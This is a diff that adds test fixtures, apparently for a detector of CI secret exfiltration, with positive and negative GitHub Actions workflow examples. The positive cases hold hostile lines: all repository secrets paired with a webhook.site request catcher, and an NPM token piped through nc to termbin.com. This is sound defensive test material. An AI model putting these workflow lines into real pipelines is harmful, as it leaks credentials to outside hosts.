@@ -170,3 +170,57 @@ RC-DLX-005:
       files:
         docs/integrations.md: |
           Send events to https://hooks.slack.com/services/T000/B000/XXXX
+
+RC-DLX-006:
+  positive:
+    - name: all secrets posted to a request catcher
+      files:
+        .github/workflows/sync.yml: |
+          on: push
+          jobs:
+            process:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo "$ENDPOINT" > /dev/null
+                  env:
+                    ENDPOINT: https://webhook.site/00000000-0000-0000-0000-000000000000
+                    CONTENTS: ${{ toJSON(secrets) }}
+      expect: [{path: .github/workflows/sync.yml, line: 8}]
+    - name: one secret sent to a paste service
+      files:
+        .github/workflows/debug.yaml: |
+          on: workflow_dispatch
+          jobs:
+            dump:
+              runs-on: ubuntu-latest
+              env:
+                TOKEN: ${{ secrets.NPM_TOKEN }}
+              steps:
+                - run: echo "$TOKEN" | nc termbin.com 9999
+      expect: [{path: .github/workflows/debug.yaml, line: 8}]
+  negative:
+    - name: chat notification with a secret webhook
+      files:
+        .github/workflows/notify.yml: |
+          on: release
+          jobs:
+            notify:
+              runs-on: ubuntu-latest
+              steps:
+                - run: curl -X POST "https://hooks.slack.com/services/${{ secrets.SLACK_PATH }}" -d '{"text":"released"}'
+                - run: curl "https://api.telegram.org/bot${{ secrets.TG_TOKEN }}/sendMessage?chat_id=1&text=ok"
+    - name: request catcher in a job without secrets
+      files:
+        .github/workflows/test.yml: |
+          on: push
+          jobs:
+            test:
+              runs-on: ubuntu-latest
+              steps:
+                - run: curl -s https://webhook.site/00000000-0000-0000-0000-000000000000/ping
+            deploy:
+              runs-on: ubuntu-latest
+              steps:
+                - run: ./deploy.sh
+                  env:
+                    KEY: ${{ secrets.DEPLOY_KEY }}
